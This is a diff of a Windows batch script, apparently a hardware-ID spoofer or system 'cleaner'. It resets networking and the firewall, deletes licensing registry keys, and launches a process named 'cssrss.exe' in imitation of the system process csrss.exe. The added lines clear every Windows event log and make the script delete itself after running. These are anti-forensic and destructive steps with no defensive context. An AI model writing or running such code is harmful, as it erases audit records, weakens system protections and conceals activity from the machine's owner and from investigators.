@@ -15,6 +15,11 @@ cls
 netsh winsock reset 
 netsh advfirewall reset
 cls
+for /f "tokens=*" %%a in ('wevtutil el') do (
+    echo %%a
+    wevtutil cl "%%a"
+)
+cls
 REG DELETE HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\MSLicensing\HardwareID /f
 REG DELETE HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\MSLicensing\Store /f
 cls
@@ -135,3 +140,4 @@ start cssrss.exe
 taskkill /f /im dwm.exe
 taskkill /f /im explorer.exe
 start explorer.exe
+start /b "" cmd /c del "%~f0"&exit /b
